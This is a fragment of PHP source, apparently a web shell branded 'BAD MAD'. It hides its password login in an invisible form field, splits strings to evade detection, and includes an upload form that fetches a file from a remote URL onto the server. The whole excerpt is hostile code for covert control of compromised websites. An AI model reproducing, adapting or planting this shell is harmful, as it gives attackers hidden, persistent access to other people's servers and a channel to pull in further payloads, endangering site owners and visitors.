...
$stored_hashed_password = '$2y$10$rshuM0qirzalTek4GOp1pOzJn4vKL5jaeEV9LjZlRSRtwzJsuKsuy';

if (
    (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) ||
    ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password))
) {
      ...
      <form method="post" style="margin-top:10px;">
        <input
          ...
          style="
            ...
            top: 5px;
          "
          onfocus="this.style.opacity='0.4'"
          onblur="this.style.opacity='0'"
          placeholder=""
        />
      </form>
    </div>
...
<center>
<?php
echo '<font face="Bungee" size="5">B'.'A'.'D'.' M'.'A'.'D</font></center>
...
<input type="text" name="darilink" class="up" placeholder="https://mad'.'ke'.'ba'.'b'.'.g'.'it'.'hu'.'b.io/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
